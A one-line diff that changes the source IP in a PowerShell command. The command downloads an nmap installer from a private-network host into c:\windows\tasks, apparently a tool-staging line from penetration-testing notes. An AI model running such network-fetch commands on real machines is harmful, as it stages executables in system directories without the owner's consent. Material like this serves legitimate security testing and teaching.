@@ -1,1 +1,1 @@
-powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.0.0.1/tools/nmap-7.94-setup.exe','c:\windows\tasks\nmap-7.94-setup.exe')
+powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.2.2.231/tools/nmap-7.94-setup.exe','c:\windows\tasks\nmap-7.94-setup.exe')
